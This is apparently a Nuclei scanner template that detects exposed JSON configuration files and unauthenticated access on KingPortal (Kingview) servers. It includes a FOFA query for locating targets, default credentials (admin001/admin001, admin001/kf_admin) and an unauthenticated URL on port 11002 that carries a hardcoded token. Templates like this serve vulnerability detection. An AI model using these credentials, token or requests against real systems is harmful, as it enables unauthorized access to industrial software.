id: kingportal-configuration-disclosure-unauth
info:
  name: KingPortal 客户端开发系统 json configuration - disclosure & unauth
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E4%BA%9A%E6%8E%A7%E7%A7%91%E6%8A%80/%E5%8C%97%E4%BA%AC%E4%BA%9A%E6%8E%A7%E7%A7%91%E6%8A%80KingPortal%E5%BC%80%E5%8F%91%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="/public/javascripts/Common/Util/km_util.js"
    tips: |
      同样可能存在,弱口令，尝试扫描 11002 是否开启 - 未授权 http://域名:11002/views/ProjectDataSourceAccess.html?token=2ccdf191078bd4e8e85b526ec44f7dd31ad7cf81&amp;refreshToken=null
      admin001/admin001
      admin001/kf_admin
  tags: year,kingview,kingportal,disclosure,unauth

http:
  - raw:
      - |
        GET /ProjectManager.json HTTP/1.1
        Host: {{Hostname}}
    
    matchers:
      - type: dsl
        name: ProjectManager
        dsl:
          - status_code == 200
          - contains_all(body,'projectGroups','admin001','projectMng','工程')
          - contains(header,'application/json')
        condition: and
  
  - raw:
      - |
        GET /config/externalConfig.json HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        name: externalConfig
        dsl:
          - status_code == 200
          - contains_all(body,'expose','redirectUrl')
          - contains(header,'application/json')
        condition: and

        